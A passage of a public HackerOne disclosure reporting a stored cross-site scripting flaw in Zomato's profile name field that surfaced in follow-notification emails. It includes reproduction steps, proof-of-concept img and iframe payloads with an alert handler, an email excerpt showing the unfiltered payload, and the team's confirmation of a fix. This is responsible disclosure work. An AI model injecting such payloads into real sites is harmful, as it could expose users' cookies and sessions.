This is not possible during registration as that input is filtered, however, it is possible when editing the user profile as no filtering of the \"your full name\" field is done at that point.\n\nThis vulnerability could be used to inject an img or iframe with an external js source that could expose a user's cookie information.\n\nThese are the steps to reproduce it:\n\n1. Register and verify an account with zomato.com\n2. Browse to the \"edit user profile\" page as a logged in user.\n3. Inject the desired html/js payload into the \"Your full name\" field.\n4. Save your profile.\n5. Browse to another user's profile.\n6. Click the \"Follow\" button.\n7. Other user will receive a \"\u003cpayload\u003e has just followed you!\" email within a few minutes that contains the html/js payload in the subject and body.\n\nI have used these payloads to confirm the vulnerability:\n```\n\"\u003e\u003c\"\u003cimg src=\"x\"\u003e%20%20\u003e \"\u003ciframe src=a\u003e%20\u003ciframe\u003e\n```\n```\n\u003cimg Src=\"http://goo.gl/JPx2sV\" onload=alert(\"PENTEST\")\u003e%20%20\u003e \"\u003ciframe Src=a\u003e%20\u003ciframe\u003e\n```\n\nAnd this is part of an email message I received that contains one of the payloads:\n```\n      \u003cspan style=\"color: white; font-size: 22px; line-height: 24px; display:block;\"\u003e\u003ca href=\"https://www.zomato.com/users/ltimg-srcquothttpgoogljpx2svquot-onloadalertquotpentestquotgt2020gt-quotltiframe-srcagt20ltiframegt-33442340?ref=email_follow_back_follower_link_1\" style=\"text-decoration: none;color: white;\"\u003e\n\u003cstrong\u003e\u003cimg Src=\"http://goo.gl/JPx2sV\" Onload=alert(\"PENTEST\")\u003e%20%20\u003e \"\u003ciframe Src=a\u003e%20\u003ciframe\u003e \u003c/strong\u003e\n\u003c/a\u003e just followed you.\u003c/span\u003e\n```\n\nWhich shows the unfiltered payload a victim would receive.\n\nThe accounts I have used for this test all use the email *@mattscodecave.com.","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-04-29T16:06:43.142Z","allow_singular_disclosure_after":-172012878.79361752,"singular_disclosure_allowed":true,"vote_count":4,"voters":["kiraak-boy","tarwadahorse","webtrack","dyabla"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":794004,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @pr0tagon1st ,\n\nThe fix is live now.\nThank you for helping keep Zomato safe for the community!\n\nRegards,\nAshish","automated_response":false,"created_at":"2016-02-11T09:46:42.871Z","updated_at":"2016-02-11T09:46:42.871Z","actor":{"username":"ashishkanwar","cleared":false,"url":"/ashishkanwar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/048/404/bc418c1ceeb4696649f18760a42f38ca70744417_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"pr0tagon1st","url":"/pr0tagon1st"},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":878228,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Hi, would you mind public disclosure?
